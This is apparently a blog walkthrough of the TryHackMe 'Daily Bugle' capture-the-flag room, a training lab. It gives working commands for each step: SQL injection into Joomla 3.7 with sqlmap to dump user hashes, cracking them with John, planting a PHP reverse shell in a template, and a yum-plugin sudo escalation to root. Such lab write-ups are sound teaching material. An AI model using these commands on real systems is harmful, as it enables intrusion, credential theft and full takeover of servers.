---
slug: daily-bugle-walkthrough
title: TryHackMe - Daily Bugle - Walkthrough
authors: bw
tags: [learning, daily-bugle, tryhackme, walkthrough]
---

This is a walkthrough for the [TryHackMe][thm] room: [Daily Bugle][daily-room]. Let’s get started!

# Deploy
Let’s start off with scanning the box! `nmap -sC -sV -oN nmap.txt <machine_ip>`

![d1](/static/img/thm/dailybugle/d1.png)

It looks like we have a webserver managed by Joomla, with a MySQL DB on the backend. Let’s visit the website!

![d2](/static/img/thm/dailybugle/d2.webp)

There is our first answer!

# Obtain user and root
From the nmap scan, we can see that it found some pages. However, before we do that, since we know it is **Joomla** let’s scan the site with `joomscan`. This can be found [here][joomscan]. This is a tool that will scan Joomla and tell is info and possible vulnerabilities.

We will run it with the following command: `perl joomscan.pl -u http://<machine_ip>`

![d3](/static/img/thm/dailybugle/d3.png)

The scan came back with a version number! After looking through the info, there isn’t much else there that we didn’t already know. Let’s search for vulnerabilities in that version.

`searchsploit joomla 3.7`

We see a few options. Let’s go with `42033`. This can be found [here][exdb]. The exploit suggests that the following URL is vulnerable:

`http://localhost/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=updatexml%27`

Let’s navigate to that URL and check on our server.

![d4](/static/img/thm/dailybugle/d4.webp)

If you see on the bottom, we get a SQL error from the DB server. This means it is vulnerable! Let’s use SQLMap to exploit this (syntax can be found in exploit information)!

```bash
sqlmap -u "http://<machine_ip>/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=updatexml" --risk=3 --level=5 --random-agent --dbs -p list[fullordering]
```

Now that we have the various database names, let’s dump out the credentials. We want the `joomla` database.

```bash
sqlmap -u "http://<machine_ip>/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=updatexml" --risk=3 --level=5 --random-agent -D joomla -T '#__users' -C id,name,username,email,password,usertype,block,sendEmail,registerDate,lastvisitDate,activation,params --dump
```

![d5](/static/img/thm/dailybugle/d5.webp)

We have the hash! Let’s crack it with **John the Ripper**. Put the hash into a file. Then run `john` against a wordlist.

`john hash.txt --wordlist=/home/bw/PenTesting/Tools/SecLists/Passwords/Common-Credentials/rockyou.txt`

We cracked the password!

![d6](/static/img/thm/dailybugle/d6.png)

Login to Joomla. Let’s see what our permissions are. Navigate to **Users** and you can see that we have **Super User** permissions. Let’s edit a template to give us a shell! Navigate to **Templates > Templates > Protostar Details and Files > index.php**

Now add our reverse shell code (This can be found [here][php]):

![d7](/static/img/thm/dailybugle/d7.png)

Save the template. Start a `netcat` listener on the port specified: `nc -lnvp 1234`

Now select **Template Preview** and you should see a shell come up! We are the apache user, so we need to find user credentials to ssh in with.

Let’s `ls /home` to find a username. Then navigate to `/var/www/html` so we can get credentials.

Here we find the `configuration.php` file. We can gather credentials here:

![d8](/static/img/thm/dailybugle/d8.png)

SSH into the box and find the user flag!

![d9](/static/img/thm/dailybugle/d9.png)

Now we need to do some privilege escalation. We need to utilize `yum` for our privesc exploit. Let’s look at [GTFObins][gtfo]. Search for `yum`. Let’s use the 2nd option.

```bash
TF=$(mktemp -d)

cat >$TF/x<<EOF

[main]

plugins=1

pluginpath=$TF

pluginconfpath=$TF

EOF


cat >$TF/y.conf<<EOF

[main]

enabled=1

EOF


cat >$TF/y.py<<EOF

import os

import yum

from yum.plugins import PluginYumExit, TYPE_CORE, TYPE_INTERACTIVE requires_api_version='2.1'

def init_hook(conduit):

   
os.execl('/bin/sh','/bin/sh')

EOF
```

`sudo yum -c $TF/x --enableplugin=y`

Now we can run: `whoami`. We are root!!!

Let’s get the flag!

![d10](/static/img/thm/dailybugle/d10.png)

# Review
Wow! This was definitely a more difficult box than I’ve done so far on THM. It was such a fun challenge and I’m glad that it put up a fight! I learned some new tools like joomscan and utilized the tried and true PHP reverse shell. Overall, this was a great room to challenge yourself!

# References
[TryHackMe][thm] | [Daily Bugle Room][daily-room] | [Joomscan][joomscan] | [Exploit-DB: 42033][exdb] | [PHP Reverse Shell][php] | [GTFObins][gtfo]

[thm]: https://tryhackme.com
[daily-room]: https://tryhackme.com/r/room/dailybugle
[joomscan]: https://github.com/OWASP/joomscan
[exdb]: https://www.exploit-db.com/exploits/42033
[php]: https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php
[gtfo]: https://gtfobins.github.io